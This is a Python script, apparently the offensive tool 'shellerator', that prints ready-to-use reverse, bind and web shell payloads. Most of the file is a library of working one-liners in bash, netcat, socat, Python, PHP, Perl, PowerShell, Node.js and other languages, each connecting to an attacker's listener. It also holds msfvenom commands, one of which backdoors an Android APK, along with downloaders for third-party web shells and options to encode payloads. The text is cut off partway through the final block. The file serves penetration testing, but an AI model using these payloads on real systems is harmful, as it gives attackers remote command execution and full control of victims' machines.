#!/usr/bin/env python3
# Author: Charlie BROMBERG (Shutdown - @_nwodtuhs)

'''
Inspired by : https://github.com/sameera-madushan/Print-My-Shell
Reverse shells found on :
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
- https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/
- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/
- https://ashr.net/bind/and/reverse/shell/cheatsheet/windows/and/linux.aspx
- https://krober.biz/misc/reverse_shell.php
'''

'''
re package can be removed as non used in the script


'''

import argparse
import sys
import re 
import base64
import urllib.parse
import psutil
import socket
from colorama import Fore
from colorama import Style
import platform
if platform.system() == 'Windows':
    from consolemenu import *
else:
    from simple_term_menu import TerminalMenu


def banner():
    print("""
           _.-''|''-._
        .-'     |     `-.
      .'\       |       /`.
    .'   \      |      /   `.
    \     \     |     /     /
     `\    \    |    /    /'
       `\   \   |   /   /'
         `\  \  |  /  /'
        _.-`\ \ | / /'-._ 
       {_____`\\|//'_____} Gimme sh3llz !!
               `-'
    """)

def menu(title, menu_list):
    if platform.system() == 'Windows':
        selection = SelectionMenu.get_selection(menu_list, title=title, show_exit_option=False)
    else:
        menu = TerminalMenu(menu_list, title=title)
        selection = menu.show()
    return menu_list[selection]

def menu_with_custom_choice(title, menu_list):
    menu_list.append('Custom')
    selection = menu(title, menu_list)
    if selection == 'Custom':
        print(f'(custom) {title}')
        if platform.system() == 'Windows':
            selection = input('>> ')
        else:
            selection = input(Fore.RED + Style.BRIGHT + '> ' + Style.RESET_ALL)
        return selection
    else:
        return selection.split('(')[1].split(')')[0]

def select_address():
    interfaces = {}
    net_if_addrs = psutil.net_if_addrs()
    for iface, addr in net_if_addrs.items():
        if iface == 'lo':
            continue
        for address in addr:
            if address.family == socket.AF_INET:
                interfaces.update({iface:address.address})

    menu_list = []
    for key in interfaces:
        menu_list.append(key + ' (' + interfaces[key] + ')')

    return menu_with_custom_choice("Listener interface/address?", menu_list)

def list_shells():
    print(Fore.BLUE + Style.BRIGHT + 'Reverse shells' + Style.RESET_ALL)
    for shell in sorted(revshells.keys()):
        print('   - ' + shell)
    print()
    print(Fore.BLUE + Style.BRIGHT + 'Bind shells' + Style.RESET_ALL)
    for shell in sorted(bindshells.keys()):
        print('   - ' + shell)
    print()
    print(Fore.BLUE + Style.BRIGHT + 'Web shells' + Style.RESET_ALL)
    for shell in sorted(webshells.keys()):
        print('   - ' + shell)
    quit()

def get_options():
    parser = argparse.ArgumentParser(description='Generate a bind/reverse/web shell', formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-l', '--list', dest='LIST', action='store_true', help='Print all the types of shells shellerator can generate')
    # Can't choose bind shell, reverse shell and web shell simultaneously
    shelltype = parser.add_mutually_exclusive_group()
    shelltype.add_argument('-b', '--bind-shell', dest='SHELLTYPE', action='store_const', const='bindshells', help='Generate a bind shell (you connect to the target)')
    shelltype.add_argument('-r', '--reverse-shell', dest='SHELLTYPE', action='store_const', const='revshells', help='Generate a reverse shell (the target connects to you) (Default)')
    shelltype.add_argument('-w', '--web-shell', dest='SHELLTYPE', action='store_const', const='webshells', help='Generate a web shell')
    parser.add_argument('-v','--verbose', action='store_true', help="Enable verbosity")
    # Sets reverse shell as default value for SHELLTYPE (https://stackoverflow.com/questions/38507675/python-argparse-mutually-exclusive-group-with-default-if-no-argument-is-given)
    parser.set_defaults(SHELLTYPE = 'revshells')
    # Creates group of options for bindshell
    bindshell = parser.add_argument_group('Bind shell options')
    # typeoption, portoption and encodeoption are three options either bindshell or revshell will need (https://stackoverflow.com/questions/23775378/allowing-same-option-in-different-argparser-group)
    typeoption = bindshell.add_argument('-t', '--type', dest='TYPE', type=str.lower, help='Type of the shell to generate (Bash, Powershell, Java...)')
    portoption = bindshell.add_argument('-lp', '--lport', dest='LPORT', type=str, help='Listener Port')
    encodeoption = bindshell.add_argument('-e', '--encode', dest='ENCODE', choices=['base64', 'double-base64', 'urlencode', 'double-urlencode'], nargs='?', const='base64', help='Encode your payload using base64 (Default), double-base64, urlencode, or double-urlencode')
    revshell = parser.add_argument_group('Reverse shell options')
    revshell._group_actions.append(typeoption)
    revshell._group_actions.append(portoption)
    revshell.add_argument('-lh', '--lhost', dest='LHOST', type=str, help='Listener IP address')
    revshell._group_actions.append(encodeoption)
    # Webshells will only need the type to be specified (The port is not needed)
    webshell = parser.add_argument_group('Web shell options')
    webshell._group_actions.append(typeoption)
    options = parser.parse_args()
    if options.LIST:
        list_shells()
    if options.SHELLTYPE == 'revshells' and not options.LHOST:
        options.LHOST = select_address()
    if options.SHELLTYPE != 'webshells' and not options.LPORT:
        menu_list = [
            'L33t (1337)',
            'HTTPS (443)',
            'HTTP (80)',
            'DNS (53)',
        ]
        options.LPORT = menu_with_custom_choice("Listener port?", menu_list)
    if not options.TYPE:
        shells_dict = globals()[options.SHELLTYPE]
        menu_list = sorted(list(shells_dict.keys()))
        options.TYPE = menu('What type of shell do you want?', menu_list)
    return options

# Helper function for populate_shells() to add values to the dictionnaries
def add_shell(shells_dict, type, shell, notes=None):
    if not type in shells_dict.keys():
        shells = []
    else:
        shells = shells_dict[type]
    shells.append((notes, shell))
    shells_dict.update({type:shells})

# Add shells to the main dictionnaries: revshells, bindshells and webshells
def populate_shells():
    add_shell(revshells, 'aspx', """wget https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/refs/heads/master/shell.aspx -qO - | sed -e 's/String host = "127.0.0.1"; \/\/CHANGE THIS/String host = "{LHOST}";/' -e 's/int port = 1234; \/\/\/\/CHANGE THIS/int port = {LPORT};/' > /tmp/shell.aspx""")
    add_shell(revshells, 'bash', '''/bin/bash -c '/bin/bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' ''')
    add_shell(revshells, 'bash', '''/bin/bash -c '/bin/bash -i > /dev/tcp/{LHOST}/{LPORT} 0<&1 2>&1' ''')
    add_shell(revshells, 'bash', '''/bin/bash -i > /dev/tcp/{LHOST}/{LPORT} 0<& 2>&1''')
    add_shell(revshells, 'bash', '''bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1''')
    add_shell(revshells, 'bash', '''exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do $line 2>&5 >&5; done''')
    add_shell(revshells, 'bash', '''exec /bin/sh 0</dev/tcp/{LHOST}/{LPORT} 1>&0 2>&0''')
    add_shell(revshells, 'bash', '''0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196''')
    add_shell(shells_dict=revshells, type='bash', notes='UDP', shell='''bash -i >& /dev/udp/{LHOST}/{LPORT} 0>&1''')
    add_shell(revshells, 'busybox', "busybox nc {LHOST} {LPORT} -e /bin/sh", 'Busybox nc')
    add_shell(revshells, 'netcat', '''nc.exe -e cmd {LHOST} {LPORT}''')
    add_shell(revshells, 'netcat', '''nc -e /bin/sh {LHOST} {LPORT}''')
    add_shell(revshells, 'netcat', '''nc -e /bin/bash {LHOST} {LPORT}''')
    add_shell(revshells, 'netcat', '''nc -c bash {LHOST} {LPORT}''')
    add_shell(revshells, 'netcat', '''mknod backpipe p && nc {LHOST} {LPORT} 0<backpipe | /bin/bash 1>backpipe ''')
    add_shell(revshells, 'netcat', '''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f''')
    add_shell(revshells, 'netcat', '''rm -f /tmp/p; mknod /tmp/p p && nc {LHOST} {LPORT} 0/tmp/p 2>&1''')
    add_shell(revshells, 'netcat', '''rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} > f''')
    add_shell(revshells, 'netcat', '''rm -f x; mknod x p && nc {LHOST} {LPORT} 0<x | /bin/bash 1>x''')
    add_shell(revshells, 'ncat', '''ncat {LHOST} {LPORT} -e /bin/bash''')
    add_shell(revshells, 'ncat', '''ncat --udp {LHOST} {LPORT} -e /bin/bash''')
    add_shell(revshells, 'telnet', '''rm -f /tmp/p; mknod /tmp/p p && telnet {LHOST} {LPORT} 0/tmp/p 2>&1''')
    add_shell(revshells, 'telnet', '''telnet {LHOST} {LPORT} | /bin/bash | telnet {LHOST} 667''')
    add_shell(revshells, 'telnet', '''rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet {LHOST} {LPORT} > f''')
    add_shell(revshells, 'telnet', '''rm -f x; mknod x p && telnet {LHOST} {LPORT} 0<x | /bin/bash 1>x''')
    add_shell(revshells, 'socat', '''/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{LHOST}:{LPORT}''')
    add_shell(revshells, 'socat', '''socat tcp-connect:{LHOST}:{LPORT} exec:"bash -li",pty,stderr,setsid,sigint,sane''')
    add_shell(revshells, 'socat', '''wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{LHOST}:{LPORT}''')
    add_shell(revshells, 'perl', '''perl -e 'use Socket;$i="{LHOST}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' ''')
    add_shell(revshells, 'perl', '''perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{LHOST}:{LPORT}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' ''')
    add_shell(shells_dict=revshells, type='perl', notes='Windows', shell='''perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"{LHOST}:{LPORT}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' ''')
    add_shell(revshells, 'python', '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ''')
    add_shell(revshells, 'python', '''export RHOST="{LHOST}";export RPORT={LPORT};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")' ''')
    add_shell(revshells, 'python', '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' ''')
    add_shell(shells_dict=revshells, type='python', notes='Windows', shell='''C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('{LHOST}', {LPORT})), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"''')
    add_shell(revshells, 'php', '''php -r '$sock=fsockopen("{LHOST}",{LPORT});exec("/bin/sh -i <&3 >&3 2>&3");' ''')
    add_shell(revshells, 'php', '''php -r '$s=fsockopen("{LHOST}",{LPORT});$proc=proc_open("/bin/sh -i", array(0=>$s, 1=>$s, 2=>$s),$pipes);' ''')
    add_shell(revshells, 'php', '''php -r '$s=fsockopen("{LHOST}",{LPORT});shell_exec("/bin/sh -i <&3 >&3 2>&3");' ''')
    add_shell(revshells, 'php', '''php -r '$s=fsockopen("{LHOST}",{LPORT});`/bin/sh -i <&3 >&3 2>&3`;' ''')
    add_shell(revshells, 'php', '''php -r '$s=fsockopen("{LHOST}",{LPORT});system("/bin/sh -i <&3 >&3 2>&3");' ''')
    add_shell(revshells, 'php', '''php -r '$s=fsockopen("{LHOST}",{LPORT});popen("/bin/sh -i <&3 >&3 2>&3", "r");' ''')
    add_shell(revshells, 'php', '''php -r '$s=\'127.0.0.1\';$p=443;@error_reporting(0);@ini_set("error_log",NULL);@ini_set("log_errors",0);@set_time_limit(0);umask(0);if($s=fsockopen($s,$p,$n,$n)){if($x=proc_open(\'/bin/sh$IFS-i\',array(array(\'pipe\',\'r\'),array(\'pipe\',\'w\'),array(\'pipe\',\'w\')),$p,getcwd())){stream_set_blocking($p[0],0);stream_set_blocking($p[1],0);stream_set_blocking($p[2],0);stream_set_blocking($s,0);while(true){if(feof($s))die(\'connection/closed\');if(feof($p[1]))die(\'shell/not/response\');$r=array($s,$p[1],$p[2]);stream_select($r,$n,$n,null);if(in_array($s,$r))fwrite($p[0],fread($s,1024));if(in_array($p[1],$r))fwrite($s,fread($p[1],1024));if(in_array($p[2],$r))fwrite($s,fread($p[2],1024));}fclose($p[0]);fclose($p[1]);fclose($p[2]);proc_close($x);}else{die("proc_open/disabled");}}else{die("not/connect");}' ''')
    add_shell(revshells, 'php', """wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php -qO - | sed -e "s/\$ip = '127.0.0.1';  \/\/ CHANGE THIS/\$ip = '{LHOST}';/" -e 's/\$port = 1234;       \/\/ CHANGE THIS/\$port = {LPORT};/' > /tmp/revshell.php""", 'Pentestmonkey php reverse shell')
    add_shell(revshells, 'php', """wget https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/refs/heads/master/src/reverse/php_reverse_shell.php -qO - | sed -e "s/('127.0.0.1', 9000)/('{LHOST}', {LPORT})/g" > /tmp/revshell.php""", 'Ivan sincek php reverse shell')
    add_shell(revshells, 'ruby', '''ruby -rsocket -e'f=TCPSocket.open("{LHOST}",{LPORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' ''')
    add_shell(revshells, 'ruby', '''ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{LHOST}","{LPORT}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end' ''')
    add_shell(shells_dict=revshells, type='ruby', notes='Windows', shell='''ruby -rsocket -e 'c=TCPSocket.new("{LHOST}","{LPORT}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end' ''')
    add_shell(revshells, 'openssl', '''mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {LHOST}:{LPORT} > /tmp/s; rm /tmp/s''')
    add_shell(revshells, 'powershell', '''$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()''')
    add_shell(revshells, 'awk', '''awk 'BEGIN {s = "/inet/tcp/0/{LHOST}/{LPORT}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null''')
    add_shell(revshells, 'tclsh', '''echo 'set s [socket {LHOST} {LPORT}];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh''')
    add_shell(revshells, 'java', '''r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()''')
    add_shell(revshells, 'java', '''String host="{LPORT}";
int port={LPORT};
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();''')
    add_shell(shells_dict=revshells, type='java', notes='More stealthy', shell='''Thread thread = new Thread(){public void run(){        //Reverse shell here        }}thread.start();''')
    add_shell(revshells, 'war', '''msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war > reverse.war
strings reverse.war | grep jsp # in order to get the name of the file''')
    add_shell(shells_dict=revshells, type='lua', notes='Linux', shell='''lua -e "require('socket');require('os');t=socket.tcp();t:connect('{LHOST}','{LPORT}');os.execute('/bin/sh -i <&3 >&3 2>&3');"''')
    add_shell(shells_dict=revshells, type='lua', notes='Windows', shell='''lua5.1 -e 'local host, port = "{LHOST}", {LPORT} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()' ''')
    add_shell(revshells, 'nodejs', '''require('child_process').exec('nc -e /bin/sh {LHOST} {LPORT}')''')
    add_shell(revshells, 'nodejs', '''-var x = global.process.mainModule.require
-x('child_process').exec('nc {LHOST} {LPORT} -e /bin/bash')''')
    add_shell(revshells, 'nodejs', '''(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect({LPORT}, "{LHOST}", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();''')
    add_shell(revshells, 'groovy', '''String host="{LHOST}";
int port={LPORT};
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();''')
    add_shell(shells_dict=revshells, type='groovy', notes='More stealthy', shell='''Thread.start {        // Reverse shell here        }''')
    add_shell(revshells, 'meterpreter', '''msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f elf > shell.elf''')
    add_shell(revshells, 'meterpreter', '''msfvenom -p windows/meterpreter/reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f exe > shell.exe''')
    add_shell(revshells, 'meterpreter', '''msfvenom -p osx/x86/shell_reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f macho > shell.macho''')
    add_shell(revshells, 'meterpreter', '''msfvenom -p windows/meterpreter/reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f asp > shell.asp''')
    add_shell(revshells, 'meterpreter', '''msfvenom -p java/jsp_shell_reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f raw > shell.jsp''')
    add_shell(revshells, 'meterpreter', '''msfvenom -p php/meterpreter_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw -o shell.php''')
    add_shell(revshells, 'meterpreter', '''msfvenom -p php/reverse_php LHOST={LHOST} LPORT={LPORT} -f raw -o shell.php''')
    add_shell(revshells, 'meterpreter', '''msfvenom -p java/jsp_shell_reverse_tcp LHOST="{LHOST}" LPORT={LPORT} -f war > shell.war''')
    add_shell(revshells, 'meterpreter', '''msfvenom -p cmd/unix/reverse_python LHOST="{LHOST}" LPORT={LPORT} -f raw > shell.py''')
    add_shell(revshells, 'meterpreter', '''msfvenom -p cmd/unix/reverse_bash LHOST="{LHOST}" LPORT={LPORT} -f raw > shell.sh''')
    add_shell(revshells, 'meterpreter', '''msfvenom -p cmd/unix/reverse_perl LHOST="{LHOST}" LPORT={LPORT} -f raw > shell.pl''')
    add_shell(revshells, 'meterpreter', '''msfvenom --platform android -p android/meterpreter/reverse_tcp lhost={LHOST} lport={LPORT} R -o reverse.apk''')
    add_shell(revshells, 'meterpreter', '''msfvenom --platform android -x template-app.apk -p android/meterpreter/reverse_tcp lhost={LHOST} lport={LPORT} -o payload.apk''')
    add_shell(shells_dict=revshells, type='meterpreter', notes='Windows Staged reverse TCP', shell='''msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe > reverse.exe''')
    add_shell(shells_dict=revshells, type='meterpreter', notes='Windows Stageless reverse TCP', shell='''msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe > reverse.exe''')
    add_shell(shells_dict=revshells, type='meterpreter', notes='Linux Staged reverse TCP', shell='''msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf >reverse.elf''')
    add_shell(shells_dict=revshells, type='meterpreter', notes='Linux Stageless reverse TCP', shell='''msfvenom -p linux/x86/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf >reverse.elf''')
    add_shell(shells_dict=revshells, type='weevely', notes='Replace "exegol4thewin" with a password of your choice', shell='weevely generate exegol4thewin /tmp/reverse.php')
    # Bindshells
    add_shell(bindshells, 'netcat', '''nc -nlvp {LPORT} -e /bin/sh''')
    add_shell(bindshells, 'netcat', '''nc.exe -nlvp {LPORT} -e cmd''')
    add_shell(bindshells, 'netcat', '''ncat -nlvp {LPORT} -e /bin/bash''')
    add_shell(bindshells, 'netcat', '''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp {LPORT} >/tmp/f''')
    add_shell(bindshells, 'php', """php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",{LPORT});socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'""")
    add_shell(bindshells, 'perl', """perl -e 'use Socket;$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i");};'""")
    add_shell(bindshells, 'python', """python -c "exec('import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",{LPORT}));s1.listen(1);c,a=s1.accept();while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())')""""")
    add_shell(bindshells, 'ruby', """ruby -rsocket -e 'f=TCPServer.new({LPORT}); s=f.accept; [0,1,2].each { |fd| IO.new(fd).reopen(s) }; exec "/bin/sh -i"'""")
    add_shell(bindshells, 'powershell', notes='Powercat must be installed on the target machine: https://github.com/besimorhino/powercat', shell='''powercat -l -p {LPORT} -ep''')
    add_shell(bindshells, 'socat', """socat TCP-LISTEN:{LPORT},reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane""" )
    # Webshells
    add_shell(webshells, 'aspx', '<% eval request("cmd") %>')
    add_shell(webshells, 'aspx', """wget https://raw.githubusercontent.com/jbarcia/Web-Shells/refs/heads/master/laudanum/aspx/shell.aspx -O /tmp/webshell.aspx""")
    add_shell(webshells, 'asp', """wget https://raw.githubusercontent.com/jbarcia/Web-Shells/refs/heads/master/laudanum/asp/shell.asp -O /tmp/webshell.asp""")
    add_shell(webshells, 'jsp', '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>')
    add_shell(webshells, 'php','<?php system($_REQUEST["cmd"]); ?>')
    add_shell(webshells, 'php', '<?php passthru($_GET["cmd"]); ?>')
    add_shell(webshells, 'php', """wget https://raw.githubusercontent.com/flozz/p0wny-shell/refs/heads/master/shell.php -O /tmp/p0wny-shell.php""")
    add_shell(webshells, 'php', """wget https://raw.githubusercontent.com/Arrexel/phpbash/refs/heads/master/phpbash.php -O /tmp/phpbash.php""", 'shell_exec function must be allowed')
    add_shell(webshells, 'php', '''<html><body><form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>"><input type="TEXT" name="cmd" autofocus id="cmd" size="80"><input type="SUBMIT" value="Execute"></form><pre><?php if(isset($_GET['cmd'])){ system($_GET['cmd'] . ' 2>&1');}?></pre></body></html>''')

# Return list of listeners for reverse shell payloads
def get_listeners(lport):
    return {
        'busybox nc': f'busybox nc -lp {lport}',
        'rlwrap + nc': f"rlwrap -cAr nc -nlvp {lport}",
        'nc': f"nc -nlvp {lport}",
        'ncat (TLS)': f'ncat --ssl -lvnp {lport}',
        'penelope': f"penelope -p {lport}",
        'pwncat (linux)': f"pwncat-cs -lp {lport}",
        'pwncat (windows)': f"python3 -m pwncat -m windows -lp {lport}",
        'ConPty': f"stty raw -echo; (stty size; cat) | nc -nlvp {lport}",
        'powercat': f"powercat -l -p {lport}",
        'socat': f'socat file:`tty`,raw,echo=0 TCP-L:{lport}'
    }

if __name__ == '__main__':
    revshells = {}
    bindshells = {}
    webshells = {}
    populate_shells()
    options = get_options()
    if options.verbose: banner()
    shells_dict = globals()[options.SHELLTYPE]
    # Check if the shell type specified by the user exists prior carrying out other actions
    if options.TYPE not in shells_dict.keys() : sys.exit(f'{Fore.RED + Style.BRIGHT}[-]{Style.RESET_ALL} No shells found for {options.TYPE}!')
    print(Fore.RED + Style.BRIGHT + '[' + options.SHELLTYPE.capitalize() + ']' + Style.RESET_ALL)
    for notes, shell in shells_dict[options.TYPE]:
        shell_index = shells_dict[options.TYPE].index((notes, shell)) + 1
        if options.LHOST is not None:
            print_shell = shell.replace('{LHOST}', options.LHOST).replace('{LPORT}', options.LPORT).strip()
            if options.ENCODE == "base64" :
                encoded_shell = base64.b64encode(print_shell.encode()).decode()
            elif options.ENCODE == "double-base64" :
                encoded_shell = base64.b64encode(base64.b64encode(print_shell.encode())).decode()
            elif options.ENCODE == "urlencode" :
                encoded_shell = urllib.parse.quote_plus(print_shell)
            elif options.ENCODE == "double-urlencode" :
                encoded_shell = urllib.parse.quote_plus(urllib.parse.quote_plus(print_shell))
        elif options.LPORT is not None:
            print_shell = shell.replace('{LPORT}', options.LPORT).strip()
        else :
            print_shell = shell.strip()
        print_notes = ''
        if notes is not None:
            print_notes = notes + ' '
        print(Fore.BLUE + Style.BRIGHT + '[' + str(shell_index) + '] ' + print_notes + Style.RESET_ALL, end='')
        if options.SHELLTYPE != 'webshells' and options.ENCODE :
            print(f"\nShell (plaintext): {print_shell}\n--")
            print(f"Shell ({options.ENCODE}): {encoded_shell}")
        else :
            print(f"{print_shell}")
    # Display listeners for reverse shell payloads
    if options.SHELLTYPE == "revshells":
        print('\n' + Fore.RED + Style.BRIGHT + '[Listeners (attacker)]' + Style.RESET_ALL)
        listeners = get_listeners(options.LPORT)
        for index, command in enumerate(listeners):
            print(f"{Fore.BLUE + Style.BRIGHT}[{index + 1}]{Style.RESET_ALL} {command}: {listeners[command]}")
    # Display the banner and command used only if the verbose option was specified
    if options.verbose:
        if options.SHELLTYPE == "webshells":
            cmdline = f'{sys.argv[0]} --web-shell --type {options.TYPE}'
        if options.SHELLTYPE == "revshells" and options.ENCODE:
